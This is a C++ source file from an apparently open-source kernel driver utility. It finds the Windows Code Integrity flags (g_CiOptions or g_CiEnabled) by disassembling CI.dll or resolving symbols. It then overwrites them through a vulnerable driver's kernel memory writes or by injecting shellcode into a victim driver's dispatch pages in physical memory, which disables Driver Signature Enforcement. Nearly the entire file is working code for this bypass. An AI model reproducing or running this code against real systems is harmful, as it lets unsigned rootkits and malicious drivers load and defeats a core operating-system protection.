/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2026
*
*  TITLE:       DSEFIX.CPP
*
*  VERSION:     1.49
*
*  DATE:        10 Jul 2026
*
*  CI DSE corruption related routines.
*  Based on DSEFix v1.3
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* 
*  Note:
* 
*  Since Windows 11 the entire CiPolicy section of CI.dll is virtual memory write protected.
*  Attempt to write there will result in a bugcheck.
*
*  Take this into account when executing 'dsefix' operations.
* 
*/

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

/*
* KDUInstuctionHasRexPrefix
*
* Purpose:
*
* Check instruction for REX prefix and compare it against
* the given mask/value pair.
*
*/
BOOL KDUInstuctionHasRexPrefix(
    _In_ hde64s* Hs,
    _In_ PBYTE Code,
    _In_ BYTE RexMask,
    _In_ BYTE RexValue
)
{
    BYTE rex;

    if (Hs == NULL || Code == NULL)
        return FALSE;

    //
    // 3-byte expected to carry REX prefix in the first byte.
    //
    if (Hs->len != 3)
        return FALSE;

    rex = Code[0];
    if ((rex & 0xF0) != 0x40)
        return FALSE;

    if ((rex & RexMask) != RexValue)
        return FALSE;

    return TRUE;
}

/*
* KDUInstructionIsRspStoreRax
*
* Purpose:
*
* Validate mov [rsp+disp], rax instruction form.
*
*/
BOOL KDUInstructionIsRspStoreRax(
    _In_ hde64s* Hs,
    _In_ PBYTE Code
)
{
    BYTE modrm;

    if (Hs == NULL || Code == NULL)
        return FALSE;

    if (Code[0] != 0x48)
        return FALSE;

    if (Hs->opcode != 0x89)
        return FALSE;

    if (!(Hs->flags & F_MODRM))
        return FALSE;

    modrm = Hs->modrm;

    //
    // mov [rsp+disp8], rax
    // 48 89 44 24 xx
    //
    if (Hs->len == 5) {
        if ((modrm == 0x44) && (Code[3] == 0x24))
            return TRUE;
    }

    //
    // mov [rsp+disp32], rax
    // 48 89 84 24 xx xx xx xx
    //
    if (Hs->len == 8) {
        if ((modrm == 0x84) && (Code[3] == 0x24))
            return TRUE;
    }

    return FALSE;
}

/*
* KDUInstructionIsRipRelativeStore32
*
* Purpose:
*
* Validate mov [rip+disp32], r32 instruction form.
*
*/
BOOL KDUInstructionIsRipRelativeStore32(
    _In_ hde64s* Hs,
    _In_ PBYTE Code
)
{
    BYTE mod, rm;

    if (Hs == NULL || Code == NULL)
        return FALSE;

    if (Hs->opcode != 0x89)
        return FALSE;

    if (!(Hs->flags & F_MODRM))
        return FALSE;

    if (!(Hs->flags & F_DISP32))
        return FALSE;

    //
    // Skip 64-bit store form, e.g. mov [rip+disp32], rax.
    //
    if ((Hs->len > 1) && (Code[0] == 0x48))
        return FALSE;

    mod = (Hs->modrm >> 6) & 0x3;
    rm = Hs->modrm & 0x7;
    if (mod != 0 || rm != 5)
        return FALSE;

    return TRUE;
}

/*
* KDUInstructionIsRegToRegMov
*
* Purpose:
*
* Validate register-to-register mov instruction with the
* given ModRM and REX prefix constraints.
*
*/
BOOL KDUInstructionIsRegToRegMov(
    _In_ hde64s* Hs,
    _In_ PBYTE Code,
    _In_ BYTE ModRm,
    _In_ BYTE RexMask,
    _In_ BYTE RexValue
)
{
    if (Hs == NULL || Code == NULL)
        return FALSE;

    if (Hs->opcode != 0x8B)
        return FALSE;

    if (!(Hs->flags & F_MODRM))
        return FALSE;

    if (Hs->modrm != ModRm)
        return FALSE;

    // 2-byte form has no REX prefix, 
    // accept it only when caller does not require any specific REX bits
    if (Hs->len == 2) {
        return ((RexMask == 0) && (RexValue == 0));
    }

    if (Hs->len != 3)
        return FALSE;

    return KDUInstuctionHasRexPrefix(Hs, Code, RexMask, RexValue);
}

/*
* KDUValidateCiInitializeCode
*
* Purpose:
*
* Validate g_CiOptions call parameters block.
*
*/
ULONG KDUValidateCiInitializeCode(
    _In_ PBYTE Code,
    _In_ ULONG Offset,
    _In_ ULONG MaxLength
)
{
    ULONG offset = Offset;
    hde64s hs;

    if (Code == NULL || MaxLength < 16)
        return 0;

    if (offset >= MaxLength)
        return 0;

    //
    // 1) mov r9, rbx (4C 8B CB)
    //
    if ((offset + 3) > MaxLength)
        return 0;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (!KDUInstructionIsRegToRegMov(&hs, &Code[offset], 0xCB, 0x0C, 0x0C))
        return 0;

    offset += hs.len;
    if (offset >= MaxLength)
        return 0;

    //
    // 2) mov r8, rdi (4C 8B C7)  OR mov r8d, edi (44 8B C7)
    //
    if ((offset + 3) > MaxLength)
        return 0;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (!(KDUInstructionIsRegToRegMov(&hs, &Code[offset], 0xC7, 0x0C, 0x0C) ||
        KDUInstructionIsRegToRegMov(&hs, &Code[offset], 0xC7, 0x04, 0x04)))
    {
        return 0;
    }

    offset += hs.len;
    if (offset >= MaxLength)
        return 0;

    //
    // 3) Either:
    //      mov rdx, rsi            (48 8B D6) len=3
    //    OR
    //      mov [rsp+..], rax       (48 89 ?? ??) len=5/8
    //      mov rdx, rsi            (48 8B D6) len=3
    //
    if ((offset + 3) > MaxLength)
        return 0;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (KDUInstructionIsRegToRegMov(&hs, &Code[offset], 0xD6, 0x08, 0x08)) {
        offset += hs.len;
    }
    else if (KDUInstructionIsRspStoreRax(&hs, &Code[offset]))
    {
        offset += hs.len;
        if (offset >= MaxLength)
            return 0;

        if ((offset + 3) > MaxLength)
            return 0;

        RtlSecureZeroMemory(&hs, sizeof(hs));
        hde64_disasm(&Code[offset], &hs);
        if (hs.flags & F_ERROR)
            return 0;

        if (!KDUInstructionIsRegToRegMov(&hs, &Code[offset], 0xD6, 0x08, 0x08))
            return 0;

        offset += hs.len;
    }
    else {
        return 0;
    }

    if (offset >= MaxLength)
        return 0;

    //
    // 4) mov ecx, ebp (8B CD) len=2
    //
    if ((offset + 2) > MaxLength)
        return 0;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 2)
        return 0;

    if (!(hs.flags & F_MODRM))
        return 0;

    if (hs.opcode != 0x8B)
        return 0;

    if (hs.modrm != 0xCD)
        return 0;

    offset += hs.len;

    return offset;
}

/*
* KDUQueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address for Windows 7.
*
*/
NTSTATUS KDUQueryCiEnabled(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ SIZE_T SizeOfImage
)
{
    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
    SIZE_T      c;
    LONG        rel = 0;

    *ResolvedAddress = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
            ntStatus = STATUS_SUCCESS;
            break;
        }
    }

    return ntStatus;
}

/*
* KDUQueryCiOptionsEx
*
* Purpose:
*
* Find CI!g_CiOptions variable address.
* Depending on current Windows version it will look for target value differently.
*
* Params:
*
*   ImageMappedBase - CI.dll user mode mapped base
*   ImageLoadedBase - CI.dll kernel mode loaded base
*   CiInitialize    - CI.dll function pointer
*   ResolvedAddress - output variable to hold result value
*   NtBuildNumber   - current NT build number for search pattern switch
*
*/
NTSTATUS KDUQueryCiOptionsEx(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _In_ PBYTE CiInitialize,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ ULONG NtBuildNumber
)
{
    BOOL        found = FALSE;
    PBYTE       ptrCode = NULL;
    ULONG       offset, k;
    LONG        relativeValue = 0;
    ULONG_PTR   resolvedAddress = 0;

    hde64s hs;

    *ResolvedAddress = 0ULL;

    ptrCode = (PBYTE)CiInitialize;
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    offset = 0;

    //
    // For Win8/8.1, Win10 until RS3
    //
    if (NtBuildNumber < NT_WIN10_REDSTONE3) {

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == 0)
                break;

            if (hs.opcode == 0xE9 && hs.len == 5) {
                relativeValue = *(PLONG)(ptrCode + offset + 1);
                found = TRUE;
                break;
            }

            offset += hs.len;

        } while (offset < 256);
    }
    else {
        //
        // Everything above Win10 RS3.
        //
        found = FALSE;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == 0)
                break;

            if (hs.len == 3) {

                //
                // Parameters for the CipInitialize.
                //
                k = KDUValidateCiInitializeCode(ptrCode, offset, 256);
                if (k != 0) {

                    hde64_disasm(&ptrCode[k], &hs);
                    if (hs.flags & F_ERROR)
                        break;

                    if (hs.len == 0)
                        break;

                    //
                    // call CipInitialize
                    //
                    if (hs.opcode == 0xE8 && hs.len == 5) {
                        offset = k;
                        relativeValue = *(PLONG)(ptrCode + k + 1);
                        found = TRUE;
                        break;
                    }
                }
            }

            offset += hs.len;

        } while (offset < 256);

    }

    if (!found)
        return STATUS_UNSUCCESSFUL;

    //
    // Lookup g_CiOptions store instruction.
    //
    ptrCode = ptrCode + offset + hs.len + relativeValue;
    relativeValue = 0;
    offset = 0;
    found = FALSE;

    do {

        hde64_disasm(&ptrCode[offset], &hs);
        if (hs.flags & F_ERROR)
            break;

        if (hs.len == 0)
            break;

        if (KDUInstructionIsRipRelativeStore32(&hs, &ptrCode[offset])) {
            relativeValue = hs.disp.disp32;
            found = TRUE;
            break;
        }

        offset += hs.len;

    } while (offset < 256);

    if (!found)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

    *ResolvedAddress = resolvedAddress;

    return STATUS_SUCCESS;
}


/*
* KDUQueryCiOptions
*
* Purpose:
*
* Find CI!g_CiOptions variable address.
* Wrapper around KDUQueryCiOptionsEx.
*
* Params:
*
*   ImageMappedBase - CI.dll user mode mapped base
*   ImageLoadedBase - CI.dll kernel mode loaded base
*   ResolvedAddress - output variable to hold result value
*   NtBuildNumber   - current NT build number for search pattern switch
*
*/
NTSTATUS KDUQueryCiOptions(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ ULONG NtBuildNumber
)
{
    PBYTE ptrCode;

    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, (PCHAR)"CiInitialize");
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    return KDUQueryCiOptionsEx(
        ImageMappedBase,
        ImageLoadedBase,
        ptrCode,
        ResolvedAddress,
        NtBuildNumber);
}

/*
* KDUQueryCodeIntegrityVariableSymbol
*
* Purpose:
*
* Find CI variable address from MS symbols.
*
*/
ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
    _In_ ULONG NtBuildNumber
)
{
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    LPCSTR lpSymbolName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (symInit() == FALSE)
        return 0;

    szFullModuleName[0] = 0;
    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
        return 0;

    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
        lpSymbolName = (LPCSTR)"g_CiEnabled";
    }
    else {
        lpModuleName = (LPWSTR)CI_DLL;
        lpSymbolName = (LPCSTR)"g_CiOptions";
    }
    _strcat(szFullModuleName, TEXT("\\"));
    _strcat(szFullModuleName, lpModuleName);

    //
    // Query loaded (kernel) base of target module.
    //
    if (NtBuildNumber < NT_WIN8_RTM) {
        imageLoadedBase = supGetNtOsBase();
    }
    else {
        imageLoadedBase = supGetModuleBaseByName(lpModuleName, NULL);
    }

    if (imageLoadedBase == 0) {
        supPrintfEvent(kduEventError,
            "[!] Could not query \"%ws\" loaded base\r\n",
            lpModuleName);
        return 0;
    }

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ws\" loaded for symbols lookup\r\n", lpModuleName);

        if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {

            if (symLookupAddressBySymbol(lpSymbolName, &kernelAddress)) {

                Result = (ULONG_PTR)imageLoadedBase + kernelAddress - (ULONG_PTR)mappedImageBase;
                supPrintfEvent(kduEventInformation, "[+] Symbol resolved to 0x%llX address\r\n", Result);

            }
            else {
                supPrintfEvent(kduEventError, "[!] Unable to find specified symbol\r\n");
            }

        }
        else {
            supPrintfEvent(kduEventError, "[!] Unable to load symbols for file\r\n");
        }

        FreeLibrary(mappedImageBase);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}

/*
* KDUQueryCodeIntegrityVariableAddress
*
* Purpose:
*
* Find CI variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
    _In_ ULONG NtBuildNumber
)
{
    NTSTATUS ntStatus;
    ULONG loadedImageSize = 0;
    SIZE_T sizeOfImage = 0;
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
    }
    else {
        lpModuleName = (LPWSTR)CI_DLL;
    }

    imageLoadedBase = supGetModuleBaseByName(lpModuleName, &loadedImageSize);
    if (imageLoadedBase == 0) {

        supPrintfEvent(kduEventError,
            "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);

        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
        return 0;

    _strcat(szFullModuleName, TEXT("\\"));
    _strcat(szFullModuleName, lpModuleName);

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);

        if (NtBuildNumber < NT_WIN8_RTM) {

            ntStatus = supQueryImageSize(mappedImageBase,
                &sizeOfImage);

            if (NT_SUCCESS(ntStatus)) {

                ntStatus = KDUQueryCiEnabled(mappedImageBase,
                    imageLoadedBase,
                    &kernelAddress,
                    sizeOfImage);

            }

        }
        else {

            ntStatus = KDUQueryCiOptions(mappedImageBase,
                imageLoadedBase,
                &kernelAddress,
                NtBuildNumber);

        }

        if (NT_SUCCESS(ntStatus)) {

            if (IN_REGION(kernelAddress,
                imageLoadedBase,
                loadedImageSize))
            {
                Result = kernelAddress;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
                    kernelAddress);

            }

        }
        else {
            supShowHardError("[!] Failed to locate kernel variable address", ntStatus);
        }

        FreeLibrary(mappedImageBase);

    }
    else {

        //
        // Output error.
        //
        supPrintfEvent(kduEventError,
            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}

/*
* KDUControlDSE2
*
* Purpose:
*
* Change Windows CodeIntegrity flags using memory brute-force.
*
*/
BOOL KDUControlDSE2(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    BYTE shellBuffer[SHELLCODE_SMALL];
    SIZE_T shellSize;

    KDU_PROVIDER* prov;
    KDU_VICTIM_PROVIDER* victimProv;
    HANDLE victimDeviceHandle = NULL;

    KDU_PHYSMEM_ENUM_PARAMS enumParams;
    VICTIM_IMAGE_INFORMATION vi;

#ifdef _DEBUG
    supPrintfEvent(kduEventError, "[!] Debug Mode run, shellcode is unavailable, abort.\r\n");
    return FALSE;
#endif

    prov = Context->Provider;
    victimProv = Context->Victim;

    shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    //
    // Validate shell size.
    //
    // 0xC offset + sizeof(ULONG_PTR)
    //
    if (shellSize < 20) {
        supPrintfEvent(kduEventError, 
            "[!] Shellcode too small for required patch offsets (size=0x%llX)\r\n", shellSize);
        return FALSE;
    }
    
    if (shellSize > SHELLCODE_SMALL) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);

        return FALSE;
    }
    
    //
    // Copy and patch shellcode.
    //
    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    //
    // Preload / open victim driver.
    //
    if (!VpCreate(victimProv,
        Context->ModuleBase,
        &victimDeviceHandle,
        NULL,
        NULL))
    {
        supPrintfEvent(kduEventError,
            "[!] Error preloading victim driver, abort\r\n");
        return FALSE;
    }

    printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);

    RtlSecureZeroMemory(&vi, sizeof(vi));
    if (!VpQueryInformation(
        Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
    {
        supShowWin32Error("[!] Cannot query victim image information", GetLastError());
    }
    else {

        enumParams.DispatchHandlerOffset = vi.DispatchOffset;
        enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        enumParams.JmpAddress = vi.JumpValue;
        enumParams.DeviceHandle = Context->DeviceHandle;
        enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
        enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        enumParams.bWrite = TRUE;
        enumParams.ccPagesFound = 0;
        enumParams.ccPagesModified = 0;
        enumParams.pvPayload = shellBuffer;
        enumParams.cbPayload = (ULONG)shellSize;

        supPrintfEvent(kduEventInformation,
            "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

        if (supEnumeratePhysicalMemory(KDUPagePatchCallback, &enumParams)) {

            printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
                enumParams.ccPagesFound,
                enumParams.ccPagesModified);

            //
            // Run shellcode.
            //
            VpExecutePayload(victimProv, &victimDeviceHandle);

            supPrintfEvent(kduEventInformation,
                "[+] DSE patch executed successfully\r\n");

            bResult = TRUE;
        }

    }

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    return bResult;
}

/*
* KDUControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state.
*
*/
BOOL KDUControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    ULONG ulFlags = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    //
    // Read current flags state.
    //
    bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
        Address,
        &ulFlags,
        sizeof(ulFlags));

    if (!bResult) {
        supShowWin32Error("[!] Cannot query DSE state", GetLastError());
    }
    else {

        printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
            (PVOID)Address,
            ulFlags,
            DSEValue);

        if (DSEValue == ulFlags) {
            printf_s("[~] Warning, current value is identical to what you want to write\r\n");
        }

        DWORD dwLastError;

        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            &DSEValue,
            sizeof(DSEValue));

        dwLastError = GetLastError();

        if (bResult) {

            printf_s("[+] Kernel memory write complete, verifying data\r\n");

            //
            // Verify write.
            //
            ulFlags = 0;
            bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                Address,
                &ulFlags,
                sizeof(ulFlags));

            dwLastError = GetLastError();

            if (bResult) {

                bResult = (ulFlags == DSEValue);

                supPrintfEvent(
                    (bResult == FALSE) ? kduEventError : kduEventInformation,
                    "%s Write result verification %s\r\n",
                    (bResult == FALSE) ? "[!]" : "[+]",
                    (bResult == FALSE) ? "failed" : "succeeded");


            }
            else {
                supShowWin32Error("[!] Cannot verify kernel memory write", dwLastError);
            }
        }
        else {
            supShowWin32Error("[!] Error while writing to the kernel memory", dwLastError);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}
